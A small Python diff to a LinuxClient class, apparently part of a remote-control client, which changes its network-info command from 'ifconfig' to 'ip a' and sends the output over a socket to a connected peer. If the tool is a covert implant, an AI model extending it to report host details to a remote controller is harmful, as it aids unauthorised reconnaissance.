@@ -236,8 +236,12 @@ class LinuxClient(Client):
             self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
 
     def ipconfig(self, args):
-        output = subprocess.check_output("ifconfig", shell=True, text=True, encoding='utf-8', errors='ignore')
-        self.secure_sock.sendall(output.encode())
+        try:
+            output = subprocess.check_output("ip a", shell=True, text=True, encoding='utf-8', stderr=subprocess.STDOUT)
+        except subprocess.CalledProcessError as e:
+            output = e.output
+        finally:
+            self.secure_sock.sendall(output.encode())
 
 if __name__ == "__main__":
     if platform.system() == 'Windows':
